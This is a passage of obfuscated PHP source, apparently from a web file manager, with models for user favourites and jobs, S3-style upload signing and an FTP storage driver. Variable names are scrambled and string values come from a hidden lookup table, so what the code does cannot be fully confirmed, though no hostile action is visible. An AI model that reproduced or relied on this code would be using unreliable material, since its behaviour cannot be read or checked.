remove($£éó‚Üñ, $¤Çïµì‘ = false) { $ƒƒ¯öò =& $_SERVER[÷åé¼î]; $óÉóä„é = $this->listData($£éó‚Üñ); if (!$óÉóä„é) { return; } if (!$¤Çïµì‘ && $óÉóä„é[$ƒƒ¯öò[191]] == $ƒƒ¯öò[91]) { return !1; } return parent::remove($£éó‚Üñ); } public function enable($ı‡÷»òä, $ ğØè¡) { return $this->update($ı‡÷»òä, array($_SERVER[÷åé¼î][2440] => $ ğØè¡)); } public function run($á¸øÅ‘ë) { return $this->update($á¸øÅ‘ë, array($_SERVER[÷åé¼î][2452] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\165\x73\145\x72\137\146\141\x76"; protected function cacheFunctionAlias($ó³ßÂüÚ) { $¥üüÑŞ¹ =& $_SERVER[÷åé¼î]; return array($¥üüÑŞ¹[2092] => array(USER_ID, $¥üüÑŞ¹[2453])); } protected function listData() { $ñ³ÔÁàì =& $_SERVER[÷åé¼î]; $°¾ÉŒé = array($ñ³ÔÁàì[1770] => USER_ID, $ñ³ÔÁàì[541] => 0); $¸ê¨œı = $ñ³ÔÁàì[2454]; $ùÆ‰²Ò = $this->field($¸ê¨œı)->where($°¾ÉŒé)->order($ñ³ÔÁàì[2455])->select(); return $ùÆ‰²Ò ? $ùÆ‰²Ò : array(); } protected function resetCache() { } protected function listView() { $“©¿Ë“¸ =& $_SERVER[÷åé¼î]; $æà©œ£° = $this->listData(); $±¦µû˜ƒ = array_filter_by_field($æà©œ£°, $“©¿Ë“¸[33], $“©¿Ë“¸[474]); $”ô»Ä»‚ = array_to_keyvalue($±¦µû˜ƒ, $“©¿Ë“¸[12], $“©¿Ë“¸[87]); if (!$”ô»Ä»‚) { return $æà©œ£°; } $·ƒıÓÅ = 2000; $¥¥ú‹Î· = array($“©¿Ë“¸[475] => array($“©¿Ë“¸[476], $”ô»Ä»‚)); $³ßÓ‡ÔÌ = Model($“©¿Ë“¸[889])->listSource($¥¥ú‹Î·, $·ƒıÓÅ); $³ßÓ‡ÔÌ = array_merge($³ßÓ‡ÔÌ[$“©¿Ë“¸[86]], $³ßÓ‡ÔÌ[$“©¿Ë“¸[85]]); $³ßÓ‡ÔÌ = array_to_keyvalue($³ßÓ‡ÔÌ, $“©¿Ë“¸[193]); foreach ($æà©œ£° as $¢¤ëçşİ => $â¯İ—­Š) { $¹®Ù•›» = $³ßÓ‡ÔÌ[$â¯İ—­Š[$“©¿Ë“¸[87]]]; $¹®Ù•›» = $¹®Ù•›» ? $¹®Ù•›» : array(); $æà©œ£°[$¢¤ëçşİ] = array_merge($¹®Ù•›», $â¯İ—­Š); } return $æà©œ£°; } protected function addFav($‚áŠ®©Á, $Å¿ŠØ‡† = '', $Ä®ÖÖ¦Ü = "\163\x6f\165\162\143\x65") { $«Á“æİ =& $_SERVER[÷åé¼î]; $ŸåÕ‰–Ë = array($«Á“æİ[1770] => USER_ID, $«Á“æİ[541] => 0, $«Á“æİ[480] => $Ä®ÖÖ¦Ü, $«Á“æİ[479] => $‚áŠ®©Á); if ($this->where($ŸåÕ‰–Ë)->find()) { return !1; } $ŸåÕ‰–Ë = array($«Á“æİ[1770] => USER_ID, $«Á“æİ[541] => 0); $åî…ëàÂ = $this->where($ŸåÕ‰–Ë)->max($«Á“æİ[2001]); if (!$åî…ëàÂ) { $åî…ëàÂ = 0; } if (!$Å¿ŠØ‡† && $Ä®ÖÖ¦Ü == $«Á“æİ[474]) { $’œçñ¾– = Model($«Á“æİ[1414])->where(array($«Á“æİ[475] => $‚áŠ®©Á))->find(); if (!$’œçñ¾–) { return !1; } $Å¿ŠØ‡† = $’œçñ¾–[$«Á“æİ[32]]; } $Å¿ŠØ‡† = $this->getAutoName($Å¿ŠØ‡†); $²İ·‚» = array($«Á“æİ[1770] => USER_ID, $«Á“æİ[541] => 0, $«Á“æİ[478] => $Å¿ŠØ‡†, $«Á“æİ[479] => $‚áŠ®©Á, $«Á“æİ[480] => $Ä®ÖÖ¦Ü, $«Á“æİ[1981] => $åî…ëàÂ + 1); return $this->add($²İ·‚»); } protected function remove($•™¹ “) { $õŸ¶Š¾Ë =& $_SERVER[÷åé¼î]; $î‹ï¹÷ = array($õŸ¶Š¾Ë[1770] => USER_ID, $õŸ¶Š¾Ë[477] => $•™¹ “); return $this->where($î‹ï¹÷)->delete(); } protected function removeByName($¼¢¿›¶ä) { $œ¢Ë’á¯ =& $_SERVER[÷åé¼î]; $‰ŒÖÍÒ• = array($œ¢Ë’á¯[1770] => USER_ID, $œ¢Ë’á¯[478] => $¼¢¿›¶ä, $œ¢Ë’á¯[541] => 0); return $this->where($‰ŒÖÍÒ•)->delete(); } protected function rename($ˆ¡ı†‘Ï, $Õ²àûªÈ) { $»âÜ²áË =& $_SERVER[÷åé¼î]; if ($ˆ¡ı†‘Ï == $Õ²àûªÈ) { return !1; } $«°…æÌ’ = $this->getAutoName($Õ²àûªÈ); if ($Õ²àûªÈ != $«°…æÌ’) { return !1; } $»½’ˆ¨ = array($»âÜ²áË[1770] => USER_ID, $»âÜ²áË[541] => 0, $»âÜ²áË[32] => $ˆ¡ı†‘Ï); return $this->where($»½’ˆ¨)->save(array($»âÜ²áË[32] => $Õ²àûªÈ)); } protected function resetSort($õÀéı ) { $¨Õ‘œ¸ø =& $_SERVER[÷åé¼î]; $õÀéı  = is_array($õÀéı ) ? $õÀéı  : array(); $«‡Ö‡Á­ = array($¨Õ‘œ¸ø[1770] => USER_ID); for ($«À»ÄÊ¸ = 0; $«À»ÄÊ¸ < count($õÀéı ); $«À»ÄÊ¸++) { $«‡Ö‡Á­[$¨Õ‘œ¸ø[477]] = $õÀéı [$«À»ÄÊ¸]; $this->where($«‡Ö‡Á­)->save(array($¨Õ‘œ¸ø[1981] => $«À»ÄÊ¸ + 1)); } return !0; } protected function moveTop($Î²àš¨) { $˜Òåøº =& $_SERVER[÷åé¼î]; $„´‹ûŠ® = array($˜Òåøº[1770] => USER_ID, $˜Òåøº[541] => 0); $·¬Ó–ö¢ = $this->where($„´‹ûŠ®)->where(array($˜Òåøº[32] => $Î²àš¨))->find(); if (!$·¬Ó–ö¢) { return; } $¾‰Ñ´Ç… = $this->field($˜Òåøº[459])->where($„´‹ûŠ®)->order($˜Òåøº[2455])->select(); $¾‰Ñ´Ç… = array_to_keyvalue($¾‰Ñ´Ç…, $˜Òåøº[12], $˜Òåøº[459]); $üù÷ìÛë = $¾‰Ñ´Ç…; $¾‰Ñ´Ç… = array_remove_value($¾‰Ñ´Ç…, $·¬Ó–ö¢[$˜Òåøº[459]]); array_unshift($¾‰Ñ´Ç…, $·¬Ó–ö¢[$˜Òåøº[459]]); return $this->resetSort($¾‰Ñ´Ç…); } protected function moveBottom($½ã©ŞÁ) { $öÖìñş =& $_SERVER[÷åé¼î]; $Äšœ›ü = array($öÖìñş[1770] => USER_ID, $öÖìñş[541] => 0); $ô¿âÏŞŠ = $this->where($Äšœ›ü)->max($öÖìñş[2001]); $à–í£÷¬ = array($öÖìñş[2001] => $ô¿âÏŞŠ + 1); return $this->where($Äšœ›ü)->where(array($öÖìñş[32] => $½ã©ŞÁ))->save($à–í£÷¬); } private function getAutoName($äœ„¯Å•) { $İ¢•Öæğ =& $_SERVER[÷åé¼î]; $ˆ¢¹É†Ñ = array($İ¢•Öæğ[1770] => USER_ID, $İ¢•Öæğ[541] => 0); $—âñÛËÈ = $this->field($İ¢•Öæğ[32])->where($ˆ¢¹É†Ñ)->select(); $—âñÛËÈ = array_to_keyvalue($—âñÛËÈ, $İ¢•Öæğ[12], $İ¢•Öæğ[32]); if (!$—âñÛËÈ || !in_array($äœ„¯Å•, $—âñÛËÈ)) { return $äœ„¯Å•; } for ($ÚàŸ€è = 0; $ÚàŸ€è < count($—âñÛËÈ); $ÚàŸ€è++) { if (!in_array($äœ„¯Å• . "\x28{$ÚàŸ€è}\51", $—âñÛËÈ)) { return $äœ„¯Å• . "\50{$ÚàŸ€è}\x29"; } } return $äœ„¯Å• . "\x28{$ÚàŸ€è}\51"; } } class UserJobModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\x65\155\56\152\x6f\x62\x4c\x69\x73\x74"; public $field = array("\156\141\155\145", "\144\145\x73\143", "\x73\157\x72\164"); const JOB_KEY = "\163\145\154\x66\112\x6f\142\x4c\x69\163\164"; public function listData($Ö›¨ÃÄ = false, $òš†£Ú½ = "\163\x6f\162\164", $¼·øº« = false) { return parent::listData($Ö›¨ÃÄ, $òš†£Ú½, $¼·øº«); } public function remove($¡Ü¾—‚Ø) { return parent::remove($¡Ü¾—‚Ø); } public function add($¯öıìŞ) { $Ãª’ÖåÀ =& $_SERVER[÷åé¼î]; if ($this->findByName($¯öıìŞ[$Ãª’ÖåÀ[32]])) { return !1; } $¯öıìŞ[$Ãª’ÖåÀ[2001]] = $this->getSort(); return parent::insert($¯öıìŞ); } private function getSort() { $¼®Ê×Áú =& $_SERVER[÷åé¼î]; $ØÀÒÄÍá = parent::listData(); $„íÏß§ä = array_to_keyvalue($ØÀÒÄÍá, $¼®Ê×Áú[12], $¼®Ê×Áú[2001]); return empty($„íÏß§ä) ? 0 : max($„íÏß§ä) + 1; } public function update($˜àŞ®İ˜, $ªĞœŞ‰²) { $ÔŒïË° =& $_SERVER[÷åé¼î]; $±“«‚õ = parent::listData($˜àŞ®İ˜); $íøì»Ğß = $this->findByName($ªĞœŞ‰²[$ÔŒïË°[32]]); if (!$±“«‚õ || $íøì»Ğß && $íøì»Ğß[$ÔŒïË°[459]] != $±“«‚õ[$ÔŒïË°[459]]) { return !1; } return parent::update($˜àŞ®İ˜, $ªĞœŞ‰²); } public function setUserJob($ºÁ², $æôñ÷ôó) { $ú÷¬“ŠË =& $_SERVER[÷åé¼î]; if (!is_array($æôñ÷ôó)) { $æôñ÷ôó = array($æôñ÷ôó); } $Àğ­´Ä = parent::listData(); $¢ºë¬Ú¸ = array_to_keyvalue($Àğ­´Ä, $ú÷¬“ŠË[32]); $¹î‡ÖÙ¯ = $ú÷¬“ŠË[438]; foreach ($æôñ÷ôó as $ÎÊÎõé„) { if ($¢ºë¬Ú¸[$ÎÊÎõé„]) { $¹î‡ÖÙ¯ .= $¢ºë¬Ú¸[$ÎÊÎõé„][$ú÷¬“ŠË[459]] . $ú÷¬“ŠË[50]; } else { $éÆŠğ = $this->add($ÎÊÎõé„); $¹î‡ÖÙ¯ .= $éÆŠğ . $ú÷¬“ŠË[50]; } } $¹î‡ÖÙ¯ = rtrim($¹î‡ÖÙ¯, $ú÷¬“ŠË[50]); Model($ú÷¬“ŠË[582])->metaSet($ºÁ², self::JOB_KEY, $¹î‡ÖÙ¯); } public function getUserJob($ÍØÏİ¶ª) { $ÓòÙÈä = Model($_SERVER[÷åé¼î][582])->metaGet($ÍØÏİ¶ª); return $this->getUserJobInfo($ÓòÙÈä[self::JOB_KEY]); } public function getUserJobInfo($ùªÅİŠ) { $™øËø™ò =& $_SERVER[÷åé¼î]; $ÅĞ†Ü´¿ = explode($™øËø™ò[50], $ùªÅİŠ); $¥òÊãÀª = parent::listData(); $¥òÊãÀª = array_remove_key($¥òÊãÀª, $™øËø™ò[231]); $áô÷™á’ = array(); foreach ($ÅĞ†Ü´¿ as $ëô¥»ê) { if (isset($¥òÊãÀª[$ëô¥»ê])) { $áô÷™á’[] = $¥òÊãÀª[$ëô¥»ê]; } } return $áô÷™á’; } } goto FİÌ«À‰°Ä; DÕÒŠà«½×: class PathDriverEDS extends PathDriverBaseS3 { public function __construct($÷àÊÈ±¡) { parent::__construct($÷àÊÈ±¡); $this->setSignVersion($_SERVER[÷åé¼î][247]); } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($©ÆµŸ‹–) { parent::__construct($©ÆµŸ‹–); $this->setSignVersion($_SERVER[÷åé¼î][247]); } public function uploadFormData($²¶ºç‡, $¸ÃáĞì„ = 3600) { $õ©ÒøÂ =& $_SERVER[÷åé¼î]; $ÏŸñªß = $õ©ÒøÂ[229]; $¶›©Õşà = $õ©ÒøÂ[270]; $ÌÇ¼–±Á = $õ©ÒøÂ[62]; $‡ïØ ÓÃ = gmdate($õ©ÒøÂ[271]); $­øëÂŸ’ = gmdate($õ©ÒøÂ[272]); $ÈßëîÜ½ = $õ©ÒøÂ[273]; $ìØÓ‚¨Ö = $¸ÃáĞì„ . $õ©ÒøÂ[12]; $ÒÙ˜¸µ… = $õ©ÒøÂ[274]; $½à…¸×œ = array($this->accessKey, $­øëÂŸ’, $this->region, $ÌÇ¼–±Á, $ÈßëîÜ½); $²Öäç¿Ë = implode($õ©ÒøÂ[8], $½à…¸×œ); $´ÓšÅëÓ = array($õ©ÒøÂ[275] => gmdate($õ©ÒøÂ[1406], strtotime($õ©ÒøÂ[277])), $õ©ÒøÂ[278] => array(array($õ©ÒøÂ[279] => $this->bucket), array($õ©ÒøÂ[280] => $ÏŸñªß), array($õ©ÒøÂ[281], $õ©ÒøÂ[282], $õ©ÒøÂ[12]), array($õ©ÒøÂ[281], $õ©ÒøÂ[283], $õ©ÒøÂ[12]), array($õ©ÒøÂ[281], $õ©ÒøÂ[284], $õ©ÒøÂ[12]), array($õ©ÒøÂ[285] => $ÒÙ˜¸µ…), array($õ©ÒøÂ[286] => $²Öäç¿Ë), array($õ©ÒøÂ[287] => $¶›©Õşà), array($õ©ÒøÂ[288] => $‡ïØ ÓÃ), array($õ©ÒøÂ[289] => $ìØÓ‚¨Ö))); $¦êÂÒ ¦ = base64_encode(json_encode($´ÓšÅëÓ)); $ñ«ª÷ß = hash_hmac($õ©ÒøÂ[290], $­øëÂŸ’, $õ©ÒøÂ[291] . $this->secret, !0); $ìŞ»ö‚› = hash_hmac($õ©ÒøÂ[290], $this->region, $ñ«ª÷ß, !0); $Œğ©à×Ÿ = hash_hmac($õ©ÒøÂ[290], $ÌÇ¼–±Á, $ìŞ»ö‚›, !0); $¶ñëÕ = hash_hmac($õ©ÒøÂ[290], $ÈßëîÜ½, $Œğ©à×Ÿ, !0); $ªÒ€……Ğ = hash_hmac($õ©ÒøÂ[290], $¦êÂÒ ¦, $¶ñëÕ); $úÈ€›¾Œ = array($õ©ÒøÂ[246] => $õ©ÒøÂ[12], $õ©ÒøÂ[292] => $õ©ÒøÂ[12], $õ©ÒøÂ[280] => $ÏŸñªß, $õ©ÒøÂ[285] => $ÒÙ˜¸µ…, $õ©ÒøÂ[293] => $¦êÂÒ ¦, $õ©ÒøÂ[294] => $²Öäç¿Ë, $õ©ÒøÂ[295] => $¶›©Õşà, $õ©ÒøÂ[296] => $‡ïØ ÓÃ, $õ©ÒøÂ[297] => $ìØÓ‚¨Ö, $õ©ÒøÂ[298] => $ªÒ€……Ğ, $õ©ÒøÂ[208] => $this->getHost()); return $úÈ€›¾Œ; } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; public $config = array(); public function __construct($ì …âîî) { parent::__construct(); if (count($ì …âîî) > 0) { $this->_init($ì …âîî); } } public function __destruct() { if (!$this->_isconn(!1)) { return !1; } return @ftp_close($this->connect); } private function charsetReset($ÕâÖ©…ˆ) { $ÍŠµÆã£ =& $_SERVER[÷åé¼î]; global $config; $this->appCharset = $config[$ÍŠµÆã£[1432]]; $this->systemCharset = $config[$ÍŠµÆã£[1433]]; if (isset($ÕâÖ©…ˆ[$ÍŠµÆã£[1434]]) && $ÕâÖ©…ˆ[$ÍŠµÆã£[1434]]) { $this->systemCharset = $ÕâÖ©…ˆ[$ÍŠµÆã£[1434]]; } } public function iconvApp($áë…°˜) { return $this->iconvTo($áë…°˜, $this->systemCharset, $this->appCharset); } public function iconvSystem($ÕŸêœÄğ) { return $this->iconvTo($ÕŸêœÄğ, $this->appCharset, $this->systemCharset); } public function getPathOuter($Ò°öİ†ß) { $‡”ÙÍü =& $_SERVER[÷åé¼î]; $Š¯¿£Ç = $this->iconvApp($this->pathBase); $Ò°öİ†ß = $this->iconvApp($Ò°öİ†ß); if (substr($Š¯¿£Ç, 0, 2) == $‡”ÙÍü[1435]) { $Š¯¿£Ç = BASIC_PATH . substr($Š¯¿£Ç, 2); } if (substr($Ò°öİ†ß, 0, 2) == $‡”ÙÍü[1435]) { $Ò°öİ†ß = BASIC_PATH . substr($Ò°öİ†ß, 2); } $Š¯¿£Ç = KodIO::clear($Š¯¿£Ç); $Ò°öİ†ß = KodIO::clear($Ò°öİ†ß); $Ò°öİ†ß = substr($Ò°öİ†ß, strlen($Š¯¿£Ç)); if (empty($this->pathDriver)) { return $Ò°öİ†ß; } return $this->pathDriver . $‡”ÙÍü[8] . ltrim($Ò°öİ†ß, $‡”ÙÍü[8]); } private function _init($äâ•ş†Ì = array()) { $Ş™ì†ã =& $_SERVER[÷åé¼î]; if (!function_exists($Ş™ì†ã[1436])) { throw new Exception(LNG($Ş™ì†ã[1437])); } $this->config = $äâ•ş†Ì; $this->charsetReset($äâ•ş†Ì); foreach ($äâ•ş†Ì as $Ñ¢¬‘šÀ => $Û¹À•Œé) { if (isset($this->{$Ñ¢¬‘šÀ})) { $this->{$Ñ¢¬‘šÀ} = $Û¹À•Œé; } } return $this->_login($äâ•ş†Ì); } private function _login($Û¹£¶Â ) { $—Î‰»Û =& $_SERVER[÷åé¼î]; static $Òæ½‰ = array(); $íƒÂŸÑ„ = md5(json_encode($Û¹£¶Â )); if (isset($Òæ½‰[$íƒÂŸÑ„])) { foreach ($Òæ½‰[$íƒÂŸÑ„] as $Íãğüù€ => $…Ê úŸ) { $this->{$Íãğüù€} = $…Ê úŸ; } return !0; } $ä²¨ÜÙÓ = parse_url(trim($this->server, $—Î‰»Û[8])); $this->host = $ä²¨ÜÙÓ[$—Î‰»Û[208]]; $şîî„° = isset($ä²¨ÜÙÓ[$—Î‰»Û[207]]) && $ä²¨ÜÙÓ[$—Î‰»Û[207]] == $—Î‰»Û[1438] ? !0 : !1; $this->scheme = $şîî„° ? $—Î‰»Û[1439] : $—Î‰»Û[1440]; $this->port = isset($ä²¨ÜÙÓ[$—Î‰»Û[209]]) ? $ä²¨ÜÙÓ[$—Î‰»Û[209]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 30); if ($this->connect === !1) { $this->writeLog(LNG($—Î‰»Û[1441]) . $this->host . $—Î‰»Û[4] . $this->port, !0); return !1; } $Ä¬É”™Ì = @ftp_login($this->connect, $this->username, $this->userpass); if (!$Ä¬É”™Ì) { $this->writeLog(LNG($—Î‰»Û[1442]) . $this->username, !0); return !1; } @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $ô—ÕË´Œ = $this->pasv == $—Î‰»Û[91] ? !0 : !1; @ftp_pasv($this->connect, $ô—ÕË´Œ); $Òæ½‰[$íƒÂŸÑ„] = array($—Î‰»Û[1443] => $this->connect, $—Î‰»Û[208] => $this->host, $—Î‰»Û[207] => $this->scheme, $—Î‰»Û[209] => $this->port); return $Ä¬É”™Ì; } private function _isconn($äõŞ³Ù¼ = true) { if (is_resource($this->connect)) { return !0; } if (!$äõŞ³Ù¼) { return !1; } return $this->_login($this->config); } public function mkfile($ô«İ, $Æš±îİİ = '', $ÜëüŒöŠ = REPEAT_RENAME) { if ($this->setContent($ô«İ, $Æš±îİİ)) { return $this->getPathOuter($ô«İ); } $this->writeLog(LNG($_SERVER[÷åé¼î][1444]), !0); return !1; } public function mkdir($²ãâ”, $û–ÇÜŞ³ = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $²ãâ” = $this->iconvSystem($²ãâ”); if ($this->_isFolder($²ãâ”) || @ftp_mkdir($this->connect, $²ãâ”)) { return $this->getPathOuter($²ãâ”); } if (!$this->mkdir($this->pathFather($²ãâ”))) { return !1; } if ($²ãâ” = @ftp_mkdir($this->connect, $²ãâ”)) { return $this->getPathOuter($²ãâ”); } $this->writeLog(__FUNCTION__ . $_SERVER[÷åé¼î][1445], !0); return !1; } public function copyFile($§¬‚¯ÚÀ, $çÙÃôÌî) { if (!$this->_isconn()) { return !1; } $·Ìõ†£Ì = $this->pathThis($this->iconvSystem($§¬‚¯ÚÀ)); $©«ä™Şç = $this->tempFile($·Ìõ†£Ì); $…Á‚‘åó = $this->iconvApp($©«ä™Şç); $this->download($§¬‚¯ÚÀ, $…Á‚‘åó); $Á€‹İĞê = $this->upload($çÙÃôÌî, $…Á‚‘åó); $this->tempFileRemve($©«ä™Şç); return $Á€‹İĞê; } public function moveFile($©†ÍÛ£ö, $ş½Ï›Æå) { if (!$this->_isconn()) { return !1; } $©†ÍÛ£ö = $this->iconvSystem($©†ÍÛ£ö); $ş½Ï›Æå = $this->iconvSystem($ş½Ï›Æå); $¢´–áù = @ftp_rename($this->connect, $©†ÍÛ£ö, $ş½Ï›Æå); if (!$¢´–áù) { $this->writeLog(__FUNCTION__ . $_SERVER[÷åé¼î][1445], !0); return !1; } return $this->getPathOuter($ş½Ï›Æå); } public function delFile($ëİÌÇŒä) { if (!$this->_isconn()) { return !1; } $ëİÌÇŒä = $this->iconvSystem($ëİÌÇŒä); $½ˆ£ŠÙ = @ftp_delete($this->connect, $ëİÌÇŒä); if (!$½ˆ£ŠÙ) { $this->writeLog(__FUNCTION__ . $_SERVER[÷åé¼î][1445], !0); } return $½ˆ£ŠÙ; } public function delFolder($ĞŠíšÁ) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $¬½ÓäÔ = $¤¥–Éı¢ = array(); $this->fileList($ĞŠíšÁ, $¬½ÓäÔ, $¤¥–Éı¢, !0); $this->listItemCache = !0; foreach ($¤¥–Éı¢ as $ÔÖÄè­Ò) { $©æ³§Å = $this->iconvSystem($ÔÖÄè­Ò[$_SERVER[÷åé¼î][32]]); $Óª¾Ú­« = @ftp_delete($this->connect, $©æ³§Å); if (!$Óª¾Ú­«) { return !1; } } foreach ($¬½ÓäÔ as $©æ³§Å) { $©æ³§Å = $this->iconvSystem($©æ³§Å); $Óª¾Ú­« = @ftp_rmdir($this->connect, $©æ³§Å); if (!$Óª¾Ú­«) { return !1; } } $ĞŠíšÁ = $this->iconvSystem($ĞŠíšÁ); return @ftp_rmdir($this->connect, $ĞŠíšÁ); } public function rename($æÃéÉ®ò, $ÆÕÖˆ£) { $ĞûÃøÍè =& $_SERVER[÷åé¼î]; if (!$this->_isconn()) { return !1; } $¹ĞûŒ· = $this->fileNameAuto($this->pathFather($æÃéÉ®ò), $ÆÕÖˆ£); $¹ĞûŒ· = $this->iconvSystem($¹ĞûŒ·); $æÃéÉ®ò = $this->iconvSystem($æÃéÉ®ò); $Ø±ÏâÂŒ = $this->pathFather($æÃéÉ®ò); $µ÷Ã¡Ï± = rtrim($Ø±ÏâÂŒ, $ĞûÃøÍè[8]) . $ĞûÃøÍè[8] . $¹ĞûŒ·; $ğóêç·ï = @ftp_rename($this->connect, $æÃéÉ®ò, $µ÷Ã¡Ï±); if (!$ğóêç·ï) { $this->writeLog(__FUNCTION__ . $ĞûÃøÍè[1445], !0); return !1; } $µ÷Ã¡Ï± = $this->iconvApp($µ÷Ã¡Ï±); return $this->getPathOuter($µ÷Ã¡Ï±); } private function folderInfo($äéîßö, $ô‚›åí = false) { $¬ƒì¦ò =& $_SERVER[÷åé¼î]; $Ò·İûâÄ = array($¬ƒì¦ò[32] => $this->pathThis($äéîßö), $¬ƒì¦ò[87] => $this->getPathOuter($¬ƒì¦ò[8] . $äéîßö), $¬ƒì¦ò[33] => $¬ƒì¦ò[78]); if ($ô‚›åí) { return $Ò·İûâÄ; } $Ò·İûâÄ[$¬ƒì¦ò[231]] = $Ò·İûâÄ[$¬ƒì¦ò[88]] = 0; $Ò·İûâÄ[$¬ƒì¦ò[232]] = $Ò·İûâÄ[$¬ƒì¦ò[233]] = !0; return $Ò·İûâÄ; } private function fileInfo($¦ãÌ©¬³, $‰†…¬ = false, $Å«ÕŸ”Ğ = array()) { $“ÌûıÌË =& $_SERVER[÷åé¼î]; $±“µªï€ = array($“ÌûıÌË[32] => $this->pathThis($¦ãÌ©¬³), $“ÌûıÌË[87] => $this->getPathOuter($“ÌûıÌË[8] . $¦ãÌ©¬³), $“ÌûıÌË[33] => $“ÌûıÌË[230], $“ÌûıÌË[79] => isset($Å«ÕŸ”Ğ[$“ÌûıÌË[79]]) ? $Å«ÕŸ”Ğ[$“ÌûıÌË[79]] : 0, $“ÌûıÌË[169] => $this->ext($¦ãÌ©¬³)); if ($‰†…¬) { return $±“µªï€; } $±“µªï€[$“ÌûıÌË[231]] = $±“µªï€[$“ÌûıÌË[88]] = 0; $±“µªï€[$“ÌûıÌË[232]] = $±“µªï€[$“ÌûıÌË[233]] = !0; $ƒÜÅ¼¶¥ = $this->iconvSystem($¦ãÌ©¬³); $±“µªï€[$“ÌûıÌË[88]] = @ftp_mdtm($this->connect, $ƒÜÅ¼¶¥); if (empty($Å«ÕŸ”Ğ)) { $Å«ÕŸ”Ğ = $this->objectMeta($¦ãÌ©¬³); if (!$Å«ÕŸ”Ğ) { return $±“µªï€; } } $±“µªï€[$“ÌûıÌË[79]] = $Å«ÕŸ”Ğ[$“ÌûıÌË[79]]; return $±“µªï€; } public function size($¢Ê‰š) { $¾‚‰›´¢ = $this->objectMeta($¢Ê‰š); return $¾‚‰›´¢ ? $¾‚‰›´¢[$_SERVER[÷åé¼î][79]] : 0; } public function info($šéŠµ’¥) { if ($this->isFile($šéŠµ’¥)) { return $this->fileInfo($šéŠµ’¥, 0); } else { if ($this->isFolder($šéŠµ’¥)) { return $this->folderInfo($šéŠµ’¥); } } return !1; } private function fileList($‹€áˆÓ», &$ö®°˜‰Ì, &$œÛİõ–¤, $µíË–›‹ = false) { $¥©âˆ›Ù =& $_SERVER[÷åé¼î]; $‹€áˆÓ» = $this->iconvSystem($‹€áˆÓ»); if (!$this->isFolder($‹€áˆÓ»)) { return !1; } @ftp_chdir($this->connect, $¥©âˆ›Ù[8]); $‹€áˆÓ» = rtrim($‹€áˆÓ», $¥©âˆ›Ù[8]) . $¥©âˆ›Ù[8]; check_abort(); $–áÅñË“ = @ftp_rawlist($this->connect, $‹€áˆÓ»); if (!$–áÅñË“) { $–áÅñË“ = array(); } $µƒáã©² = array($¥©âˆ›Ù[10] => 1, $¥©âˆ›Ù[1357] => 1); foreach ($–áÅñË“ as $ªÁ‚µşÍ) { $ƒ÷é…ÍÏ = $this->_listItem($ªÁ‚µşÍ); if ($ƒ÷é…ÍÏ[0] == $¥©âˆ›Ù[823]) { continue; } $Îıèóï = $ƒ÷é…ÍÏ[8]; if (empty($Îıèóï) && $Îıèóï !== $¥©âˆ›Ù[228] || isset($µƒáã©²[$Îıèóï])) { continue; } $Îıèóï = $this->iconvApp($‹€áˆÓ» . ltrim($Îıèóï, $¥©âˆ›Ù[8])); $çŞ­‘ªü = array($¥©âˆ›Ù[32] => $Îıèóï, $¥©âˆ›Ù[33] => $¥©âˆ›Ù[230], $¥©âˆ›Ù[79] => $ƒ÷é…ÍÏ[4]); if (substr($ªÁ‚µşÍ, 0, 1) == $¥©âˆ›Ù[1446]) { $çŞ­‘ªü[$¥©âˆ›Ù[33]] = $¥©âˆ›Ù[78]; $çŞ­‘ªü[$¥©âˆ›Ù[79]] = 0; } $ÇØŞ»¡Ÿ = $çŞ­‘ªü[$¥©âˆ›Ù[33]] == $¥©âˆ›Ù[78] ? !0 : !1; $this->cacheMethodInfoSet($Îıèóï, $ÇØŞ»¡Ÿ, $çŞ­‘ªü); if ($ÇØŞ»¡Ÿ) { $ö®°˜‰Ì[] = $Îıèóï; if ($µíË–›‹) { $this->fileList($Îıèóï, $ö®°˜‰Ì, $œÛİõ–¤, $µíË–›‹); } continue; } $œÛİõ–¤[] = $çŞ­‘ªü; } $this->cacheMethodInfoSet($‹€áˆÓ», !0); } private function _listItem($²æ—Ø³†) { if (empty($²æ—Ø³†)) { return array(); } $¡ï”ŠŞ¤ = preg_split($_SERVER[÷åé¼î][1447], $²æ—Ø³†); if (count($¡ï”ŠŞ¤) <= 9) { return $¡ï”ŠŞ¤; } $¡ï”ŠŞ¤[8] = trim(substr($²æ—Ø³†, strpos($²æ—Ø³†, $¡ï”ŠŞ¤[7]) + strlen($¡ï”ŠŞ¤[7]))); return array_splice($¡ï”ŠŞ¤, 0, 9); } public function listPath($»½´éóì, $äÂ­Ïú× = false) { $Õô¨üÚ =& $_SERVER[÷åé¼î]; if (!$this->_isconn()) { return !1; } $ı à‰†ç = $²µéî€ = array(); $this->fileList($»½´éóì, $ı à‰†ç, $²µéî€); foreach ($ı à‰†ç as $¸ÅÀ‡ô => $È¹ŸŠù) { $ı à‰†ç[$¸ÅÀ‡ô] = $this->folderInfo($È¹ŸŠù, $äÂ­Ïú×); } foreach ($²µéî€ as $¸ÅÀ‡ô => $È¹ŸŠù) { $²µéî€[$¸ÅÀ‡ô] = $this->fileInfo($È¹ŸŠù[$Õô¨üÚ[32]], $äÂ­Ïú×, $È¹ŸŠù); } return array($Õô¨üÚ[85] => $ı à‰†ç, $Õô¨üÚ[86] => $²µéî€); } public function has($Ÿéõº®Ø, $É—ºæ›ô = false, $™º‘ıÉÒ = true) { $¤õ—Ó¢÷ =& $_SERVER[÷åé¼î]; $¾ÕëÔÌ× = $¿ˆúŒÆ§ = array(); $Èé²´–³ = $É—ºæ›ô ? !0 : !1; $this->fileList($Ÿéõº®Ø, $¾ÕëÔÌ×, $¿ˆúŒÆ§, $Èé²´–³); if ($É—ºæ›ô) { return array($¤õ—Ó¢÷[239] => count($¿ˆúŒÆ§), $¤õ—Ó¢÷[240] => count($¾ÕëÔÌ×)); } if ($™º‘ıÉÒ) { if (count($¿ˆúŒÆ§)) { return !0; } } else { if (count($¾ÕëÔÌ×)) { return !0; } } return !1; } public function listAll($„°¢òĞ) { $‡³Ñ‹Ë± =& 